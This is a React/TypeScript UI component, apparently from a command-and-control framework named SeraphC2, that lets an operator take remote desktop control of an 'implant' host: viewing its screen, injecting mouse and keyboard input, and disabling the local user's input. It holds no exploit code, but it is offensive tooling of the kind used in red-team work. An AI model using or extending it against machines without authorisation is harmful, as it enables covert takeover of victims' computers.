/**
 * RemoteDesktopController - Remote desktop interaction component for SeraphC2
 * Implements requirements 11.1, 11.2, 11.4 from the SeraphC2 specification
 */

import React, { useState, useEffect, useCallback, useRef } from 'react';
import {
  Box,
  Card,
  CardContent,
  Typography,
  Button,
  Grid,
  FormControl,
  InputLabel,
  Select,
  MenuItem,
  Slider,
  Switch,
  FormControlLabel,
  Alert,
  CircularProgress,
  Chip,
  IconButton,
  Tooltip,
  Dialog,
  DialogTitle,
  DialogContent,
  DialogActions,
  Paper,
  Divider,
} from '@mui/material';
import {
  Mouse,
  Keyboard,
  Settings,
  PowerOff,
  Power,
  TouchApp,
  Block,
  CheckCircle,
  Warning,
  Info,
} from '@mui/icons-material';
import remoteDesktopService, {
  RemoteDesktopConfig,
  RemoteDesktopStatus,
  MouseClickEvent,
  MouseMoveEvent,
  KeyboardEvent,
} from '../../services/remoteDesktopService';
import { ScreenMonitor } from '../Screen/ScreenMonitor';

interface RemoteDesktopControllerProps {
  implantId: string;
  onError?: (error: string) => void;
  onStatusChange?: (status: RemoteDesktopStatus | null) => void;
}

export const RemoteDesktopController: React.FC<RemoteDesktopControllerProps> = ({
  implantId,
  onError,
  onStatusChange,
}) => {
  const [config, setConfig] = useState<RemoteDesktopConfig>(
    remoteDesktopService.getDefaultConfig()
  );
  const [status, setStatus] = useState<RemoteDesktopStatus | null>(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [isActive, setIsActive] = useState(false);
  const [showSettings, setShowSettings] = useState(false);
  const [mousePosition, setMousePosition] = useState<{ x: number; y: number } | null>(null);
  const [isMouseCaptured, setIsMouseCaptured] = useState(false);
  const [keyboardFocused, setKeyboardFocused] = useState(false);

  const screenImageRef = useRef<HTMLImageElement>(null);
  const keyboardInputRef = useRef<HTMLDivElement>(null);
  const mouseMoveThrottleRef = useRef<NodeJS.Timeout | null>(null);

  // Load status on component mount
  useEffect(() => {
    loadRemoteDesktopStatus();
  }, [implantId]);

  // Notify parent of status changes
  useEffect(() => {
    onStatusChange?.(status);
  }, [status, onStatusChange]);

  // Keyboard event listeners
  useEffect(() => {
    if (isActive && keyboardFocused && config.enableKeyboardInput) {
      const handleKeyDown = (event: KeyboardEvent) => {
        event.preventDefault();
        sendKeyboardInput(remoteDesktopService.convertDOMKeyboardEvent(event as any, 'down'));
      };

      const handleKeyUp = (event: KeyboardEvent) => {
        event.preventDefault();
        sendKeyboardInput(remoteDesktopService.convertDOMKeyboardEvent(event as any, 'up'));
      };

      document.addEventListener('keydown', handleKeyDown);
      document.addEventListener('keyup', handleKeyUp);

      return () => {
        document.removeEventListener('keydown', handleKeyDown);
        document.removeEventListener('keyup', handleKeyUp);
      };
    }
  }, [isActive, keyboardFocused, config.enableKeyboardInput]);

  const loadRemoteDesktopStatus = async () => {
    try {
      setLoading(true);
      setError(null);

      const remoteStatus = await remoteDesktopService.getRemoteDesktopStatus(implantId);
      setStatus(remoteStatus);
      setIsActive(remoteStatus?.isActive || false);

      if (remoteStatus?.config) {
        setConfig(remoteStatus.config);
      }
    } catch (error) {
      const errorMessage = 'Failed to load remote desktop status';
      setError(errorMessage);
      onError?.(errorMessage);
    } finally {
      setLoading(false);
    }
  };

  const initializeRemoteDesktop = async () => {
    try {
      setLoading(true);
      setError(null);

      const result = await remoteDesktopService.initializeRemoteDesktop(implantId, config);

      if (result.success) {
        setIsActive(true);
        await loadRemoteDesktopStatus();
      } else {
        setError(result.message);
        onError?.(result.message);
      }
    } catch (error) {
      const errorMessage = 'Failed to initialize remote desktop';
      setError(errorMessage);
      onError?.(errorMessage);
    } finally {
      setLoading(false);
    }
  };

  const terminateRemoteDesktop = async () => {
    try {
      setLoading(true);
      setError(null);

      const result = await remoteDesktopService.terminateRemoteDesktop(implantId);

      if (result.success) {
        setIsActive(false);
        setStatus(null);
        setIsMouseCaptured(false);
        setKeyboardFocused(false);
      } else {
        setError(result.message);
        onError?.(result.message);
      }
    } catch (error) {
      const errorMessage = 'Failed to terminate remote desktop';
      setError(errorMessage);
      onError?.(errorMessage);
    } finally {
      setLoading(false);
    }
  };

  const toggleLocalInput = async () => {
    try {
      setLoading(true);
      setError(null);

      const result = status?.localInputDisabled
        ? await remoteDesktopService.enableLocalInput(implantId)
        : await remoteDesktopService.disableLocalInput(implantId);

      if (result.success) {
        await loadRemoteDesktopStatus();
      } else {
        setError(result.message);
        onError?.(result.message);
      }
    } catch (error) {
      const errorMessage = 'Failed to toggle local input';
      setError(errorMessage);
      onError?.(errorMessage);
    } finally {
      setLoading(false);
    }
  };

  const sendMouseClick = async (mouseEvent: MouseClickEvent) => {
    if (!isActive || !config.enableMouseInput) return;

    try {
      await remoteDesktopService.sendMouseClick(implantId, mouseEvent);
      await loadRemoteDesktopStatus(); // Update input count
    } catch (error) {
      console.error('Failed to send mouse click:', error);
    }
  };

  const sendMouseMove = useCallback(
    async (mouseEvent: MouseMoveEvent) => {
      if (!isActive || !config.enableMouseInput) return;

      // Throttle mouse move events
      if (mouseMoveThrottleRef.current) {
        clearTimeout(mouseMoveThrottleRef.current);
      }

      mouseMoveThrottleRef.current = setTimeout(async () => {
        try {
          await remoteDesktopService.sendMouseMove(implantId, mouseEvent);
        } catch (error) {
          console.error('Failed to send mouse move:', error);
        }
      }, 50); // 20 FPS max for mouse moves
    },
    [isActive, config.enableMouseInput, implantId]
  );

  const sendKeyboardInput = async (keyEvent: KeyboardEvent) => {
    if (!isActive || !config.enableKeyboardInput) return;

    try {
      await remoteDesktopService.sendKeyboardInput(implantId, keyEvent);
      await loadRemoteDesktopStatus(); // Update input count
    } catch (error) {
      console.error('Failed to send keyboard input:', error);
    }
  };

  const handleScreenMouseClick = (event: React.MouseEvent<HTMLImageElement>) => {
    if (!screenImageRef.current || !isMouseCaptured) return;

    event.preventDefault();
    const mouseEvent = remoteDesktopService.convertDOMMouseEvent(
      event,
      screenImageRef.current,
      'click'
    );
    sendMouseClick(mouseEvent);
  };

  const handleScreenMouseMove = (event: React.MouseEvent<HTMLImageElement>) => {
    if (!screenImageRef.current || !isMouseCaptured) return;

    const mouseEvent = remoteDesktopService.convertDOMMouseMoveEvent(event, screenImageRef.current);
    setMousePosition({ x: mouseEvent.x, y: mouseEvent.y });
    sendMouseMove(mouseEvent);
  };

  const handleScreenDoubleClick = (event: React.MouseEvent<HTMLImageElement>) => {
    if (!screenImageRef.current || !isMouseCaptured) return;

    event.preventDefault();
    const mouseEvent = remoteDesktopService.convertDOMMouseEvent(
      event,
      screenImageRef.current,
      'double_click'
    );
    sendMouseClick(mouseEvent);
  };

  const handleScreenContextMenu = (event: React.MouseEvent<HTMLImageElement>) => {
    if (!screenImageRef.current || !isMouseCaptured) return;

    event.preventDefault();
    const mouseEvent = remoteDesktopService.convertDOMMouseEvent(
      event,
      screenImageRef.current,
      'click'
    );
    sendMouseClick(mouseEvent);
  };

  const updateConfig = (newConfig: Partial<RemoteDesktopConfig>) => {
    setConfig(prev => ({ ...prev, ...newConfig }));
  };

  const toggleMouseCapture = () => {
    setIsMouseCaptured(!isMouseCaptured);
  };

  const toggleKeyboardFocus = () => {
    setKeyboardFocused(!keyboardFocused);
    if (!keyboardFocused && keyboardInputRef.current) {
      keyboardInputRef.current.focus();
    }
  };

  return (
    <Box>
      <Card>
        <CardContent>
          <Box display="flex" justifyContent="space-between" alignItems="center" mb={2}>
            <Typography variant="h6" component="h2">
              Remote Desktop Controller
            </Typography>
            <Box>
              <Tooltip title="Settings">
                <IconButton onClick={() => setShowSettings(true)}>
                  <Settings />
                </IconButton>
              </Tooltip>
            </Box>
          </Box>

          {error && (
            <Alert severity="error" sx={{ mb: 2 }}>
              {error}
            </Alert>
          )}

          <Grid container spacing={2}>
            <Grid item xs={12} md={8}>
              {/* Screen Display with Remote Desktop Overlay */}
              <Card variant="outlined" sx={{ position: 'relative' }}>
                <CardContent>
                  <ScreenMonitor
                    implantId={implantId}
                    onError={onError}
                    onImageRef={(ref: HTMLImageElement | null) => {
                      if (ref) {
                        screenImageRef.current = ref;
                      }
                    }}
                    onMouseClick={isMouseCaptured ? handleScreenMouseClick : undefined}
                    onMouseMove={isMouseCaptured ? handleScreenMouseMove : undefined}
                    onDoubleClick={isMouseCaptured ? handleScreenDoubleClick : undefined}
                    onContextMenu={isMouseCaptured ? handleScreenContextMenu : undefined}
                  />

                  {/* Remote Desktop Overlay */}
                  {isActive && (
                    <Box
                      position="absolute"
                      top={8}
                      left={8}
                      bgcolor="rgba(0,0,0,0.8)"
                      color="white"
                      p={1}
                      borderRadius={1}
                      display="flex"
                      alignItems="center"
                      gap={1}
                    >
                      <CheckCircle fontSize="small" color="success" />
                      <Typography variant="caption">Remote Desktop Active</Typography>
                    </Box>
                  )}

                  {/* Mouse Position Indicator */}
                  {mousePosition && isMouseCaptured && (
                    <Box
                      position="absolute"
                      bottom={8}
                      right={8}
                      bgcolor="rgba(0,0,0,0.7)"
                      color="white"
                      p={1}
                      borderRadius={1}
                    >
                      <Typography variant="caption">
                        Mouse: {mousePosition.x}, {mousePosition.y}
                      </Typography>
                    </Box>
                  )}
                </CardContent>
              </Card>

              {/* Control Buttons */}
              <Box mt={2} display="flex" gap={1} flexWrap="wrap">
                {!isActive ? (
                  <Button
                    variant="contained"
                    color="success"
                    startIcon={<Power />}
                    onClick={initializeRemoteDesktop}
                    disabled={loading}
                  >
                    Start Remote Desktop
                  </Button>
                ) : (
                  <Button
                    variant="contained"
                    color="error"
                    startIcon={<PowerOff />}
                    onClick={terminateRemoteDesktop}
                    disabled={loading}
                  >
                    Stop Remote Desktop
                  </Button>
                )}

                {isActive && (
                  <>
                    <Button
                      variant={isMouseCaptured ? 'contained' : 'outlined'}
                      color={isMouseCaptured ? 'primary' : 'inherit'}
                      startIcon={<Mouse />}
                      onClick={toggleMouseCapture}
                      disabled={!config.enableMouseInput}
                    >
                      {isMouseCaptured ? 'Release Mouse' : 'Capture Mouse'}
                    </Button>

                    <Button
                      variant={keyboardFocused ? 'contained' : 'outlined'}
                      color={keyboardFocused ? 'primary' : 'inherit'}
                      startIcon={<Keyboard />}
                      onClick={toggleKeyboardFocus}
                      disabled={!config.enableKeyboardInput}
                    >
                      {keyboardFocused ? 'Release Keyboard' : 'Capture Keyboard'}
                    </Button>

                    <Button
                      variant="outlined"
                      startIcon={status?.localInputDisabled ? <TouchApp /> : <Block />}
                      onClick={toggleLocalInput}
                      disabled={loading}
                    >
                      {status?.localInputDisabled ? 'Enable Local Input' : 'Disable Local Input'}
                    </Button>
                  </>
                )}
              </Box>

              {/* Keyboard Input Area */}
              {isActive && keyboardFocused && (
                <Paper
                  ref={keyboardInputRef}
                  sx={{
                    mt: 2,
                    p: 2,
                    minHeight: 60,
                    border: '2px dashed',
                    borderColor: 'primary.main',
                    cursor: 'text',
                  }}
                  tabIndex={0}
                >
                  <Typography variant="body2" color="primary">
                    Keyboard input active - Type here to send to remote desktop
                  </Typography>
                </Paper>
              )}
            </Grid>

            <Grid item xs={12} md={4}>
              {/* Remote Desktop Status */}
              <Card variant="outlined" sx={{ mb: 2 }}>
                <CardContent>
                  <Typography variant="subtitle1" gutterBottom>
                    Remote Desktop Status
                  </Typography>

                  <Box display="flex" alignItems="center" gap={1} mb={1}>
                    <Chip
                      label={isActive ? 'Active' : 'Inactive'}
                      color={isActive ? 'success' : 'default'}
                      size="small"
                    />
                  </Box>

                  {status && (
                    <>
                      <Typography variant="body2" color="textSecondary">
                        Mouse Input: {status.mouseInputEnabled ? 'Enabled' : 'Disabled'}
                      </Typography>
                      <Typography variant="body2" color="textSecondary">
                        Keyboard Input: {status.keyboardInputEnabled ? 'Enabled' : 'Disabled'}
                      </Typography>
                      <Typography variant="body2" color="textSecondary">
                        Local Input: {status.localInputDisabled ? 'Disabled' : 'Enabled'}
                      </Typography>
                      <Typography variant="body2" color="textSecondary">
                        Input Count: {remoteDesktopService.formatInputCount(status.inputCount)}
                      </Typography>
                      <Typography variant="body2" color="textSecondary">
                        Last Input: {remoteDesktopService.formatLastInputTime(status.lastInputTime)}
                      </Typography>
                    </>
                  )}
                </CardContent>
              </Card>

              {/* Quick Settings */}
              <Card variant="outlined">
                <CardContent>
                  <Typography variant="subtitle1" gutterBottom>
                    Quick Settings
                  </Typography>

                  <FormControlLabel
                    control={
                      <Switch
                        checked={config.enableMouseInput}
                        onChange={e => updateConfig({ enableMouseInput: e.target.checked })}
                        disabled={isActive}
                      />
                    }
                    label="Enable Mouse Input"
                  />

                  <FormControlLabel
                    control={
                      <Switch
                        checked={config.enableKeyboardInput}
                        onChange={e => updateConfig({ enableKeyboardInput: e.target.checked })}
                        disabled={isActive}
                      />
                    }
                    label="Enable Keyboard Input"
                  />

                  <FormControlLabel
                    control={
                      <Switch
                        checked={config.disableLocalInput}
                        onChange={e => updateConfig({ disableLocalInput: e.target.checked })}
                        disabled={isActive}
                      />
                    }
                    label="Disable Local Input on Start"
                  />

                  <Box mt={2}>
                    <Typography variant="body2" gutterBottom>
                      Mouse Sensitivity: {config.mouseSensitivity.toFixed(1)}x
                    </Typography>
                    <Slider
                      value={config.mouseSensitivity}
                      onChange={(_, value) => updateConfig({ mouseSensitivity: value as number })}
                      min={0.1}
                      max={2.0}
                      step={0.1}
                      marks={[
                        { value: 0.5, label: 'Slow' },
                        { value: 1.0, label: 'Normal' },
                        { value: 1.5, label: 'Fast' },
                        { value: 2.0, label: 'Very Fast' },
                      ]}
                      disabled={isActive}
                    />
                  </Box>
                </CardContent>
              </Card>
            </Grid>
          </Grid>
        </CardContent>
      </Card>

      {/* Settings Dialog */}
      <Dialog open={showSettings} onClose={() => setShowSettings(false)} maxWidth="sm" fullWidth>
        <DialogTitle>Remote Desktop Settings</DialogTitle>
        <DialogContent>
          <Box py={2}>
            <Typography variant="subtitle2" gutterBottom>
              Quality Presets
            </Typography>

            <Grid container spacing={2} sx={{ mb: 3 }}>
              {(['low_latency', 'balanced', 'high_quality'] as const).map(preset => {
                const settings = remoteDesktopService.getQualitySettings(preset);
                return (
                  <Grid item xs={4} key={preset}>
                    <Button
                      variant="outlined"
                      fullWidth
                      onClick={() => updateConfig({ mouseSensitivity: settings.mouseSensitivity })}
                      disabled={isActive}
                    >
                      {preset.replace('_', ' ').replace(/\b\w/g, l => l.toUpperCase())}
                    </Button>
                  </Grid>
                );
              })}
            </Grid>

            <Divider sx={{ my: 2 }} />

            <FormControl fullWidth sx={{ mb: 2 }}>
              <InputLabel>Keyboard Layout</InputLabel>
              <Select
                value={config.keyboardLayout || 'en-US'}
                onChange={e => updateConfig({ keyboardLayout: e.target.value })}
                disabled={isActive}
              >
                <MenuItem value="en-US">English (US)</MenuItem>
                <MenuItem value="en-GB">English (UK)</MenuItem>
                <MenuItem value="de-DE">German</MenuItem>
                <MenuItem value="fr-FR">French</MenuItem>
                <MenuItem value="es-ES">Spanish</MenuItem>
                <MenuItem value="it-IT">Italian</MenuItem>
              </Select>
            </FormControl>

            <Alert severity="info" sx={{ mt: 2 }}>
              <Typography variant="body2">
                Settings can only be changed when remote desktop is inactive. Changes will take
                effect on the next session.
              </Typography>
            </Alert>
          </Box>
        </DialogContent>
        <DialogActions>
          <Button onClick={() => setShowSettings(false)}>Close</Button>
        </DialogActions>
      </Dialog>
    </Box>
  );
};

export default RemoteDesktopController;
